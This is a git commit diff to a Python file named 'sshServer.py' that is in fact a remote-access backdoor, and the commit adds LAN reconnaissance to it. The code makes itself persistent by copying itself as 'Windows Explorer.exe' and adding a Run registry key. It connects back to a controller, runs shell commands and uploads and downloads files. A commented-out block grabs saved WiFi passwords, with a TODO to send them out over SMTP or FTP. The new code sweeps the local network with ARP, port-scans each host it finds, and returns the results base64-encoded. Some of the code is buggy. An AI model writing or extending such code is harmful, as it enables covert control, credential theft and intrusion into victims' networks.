c162acb605fce4790b9cdb472646b15b909ce643
numberx <shekooha696@gmail.com>
2022-01-15 13:07:36 +0330

    implemented FULL NETWORK SCAN

--- sshServer.py
+++ sshServer.py
@@ -9,6 +9,9 @@ import base64
 import sys
 import shutil
 import re
+import scapy.all as scapy
+
+
 
 
 class Backdoor():
@@ -16,22 +19,16 @@ class Backdoor():
         self.persistence()
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((ip, port))
-
     def persistence(self):
         location = os.environ["appdata"] + "\\Windows Explorer.exe"
         if not os.path.exists(location):
             shutil.copyfile(sys.executable, location)
             subprocess.call('reg add HKCU\Software\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + location + '"' , shell=True)
-
     def cmd_send(self, data):
-    	
         json_send = json.dumps(data)
         self.connection.send(json_send)
-
     def cmd_recv(self):
-        
         json_recived = ""
-
         while True:
             try:
                 json_recived += self.connection.recv(1024)
@@ -39,35 +36,26 @@ class Backdoor():
             except ValueError:
                 continue
     def change_dir(self, path):
-        
         os.chdir(path)
-    
         return "Changed dir to %s" % path
     def upload_file(self, path, content):
-    	
         with open(path, "wb") as file:
             uploaded_file = base64.b64decode(content)
             file.write(uploaded_file)
             return "Uploaded Succesfully !"
-
     def download_file(self, path):
         with open(path, "rb") as file:
             download_file = base64.b64encode(file.read())
             return download_file
-
     def exec_command(self, command):
         return subprocess.check_output(command, shell=True)
-
     def get_ip():
         # Gets public IP address of this network.
-        
         data = str(urlopen('http://checkip.dyndns.com/').read())
         ip = socket.gethostbyname(socket.gethostname())
         private = ip
         pub = re.compile(r'Address: (\d+.\d+.\d+.\d+)').search(data).group(1)
-        return f"Private ip of the machine is {private}\nPublic ip of the machine is {pub}"
-
-
+        return f"Private ip of the machine is {private}\nPublic ip of the machine is {pub}", private, pub
     # def get_wifi():
     #     #Get all saved wifi Bitch
     #     data = os.popen("netsh wlan show profiles").read()
@@ -83,9 +71,48 @@ class Backdoor():
     #     except:
         
     #         return " "
-    #TODO: send the wifi passes or maybe read them dynamicly
+    #TODO: send the wifi passes through smtp or ftp or maybe read them dynamicly
 
-
+    def arp_scan(self):
+        # scans the entire network 
+        ip = self.get_ip.private
+        arp_request = scapy.ARP(pdst=ip)
+        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+        arp_request_broadcast = broadcast / arp_request
+        answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
+        machines = []
+        for i in answered_list:
+            machine_dict = {"ip": i[1].psrc, "mac": i[1].hwsrc}
+            machines.append(machine_dict)
+        return machines
+    def port_scan(self, ip):
+        target = ip
+        data = ""
+        try:
+            for port in range(1,65535):
+                s = socket.socket((socket.AF_INET,socket.SOCK_STREAM))
+                socket.setdeafulttimeout(1)
+                result = s.connect_ex((target,port))
+                if result == 0:
+                    data += f"---\tIP {target}\n\n\t{port} is open"
+                s.close()
+        except KeyboardIntrrupt:
+            data += "\nKeyboard Intrupted ."
+            pass 
+        except socket.gaierror:
+            data += f"\nCould not Resilve IP : {target}"
+            sys.exit()
+        except socket.error:
+            data += f"\n Server not Working ..."
+            sys.exit()
+        return data
+    def scan_result(self):
+        result = ""
+        for host in self.arp_scan:
+            result += self.port_scan(host) 
+        encoded_result = base64.b64encode(result)
+        return encoded_result
+        
 
     def run(self):
         while True:
@@ -102,6 +129,8 @@ class Backdoor():
                     cmd_rslt = self.upload_file(rcvd_cmd[1], rcvd_cmd[2])
                 elif rcvd_cmd[0] == "getip":
                     cmd_rslt = self.get_ip
+                elif rcvd_cmd[0] == "scan":
+                    cmd_rslt = self.scan_result
                 # elif rcvd_cmd[0] == "get_wifi":
                     # cmd_rslt = self.get_wifi
                 else:
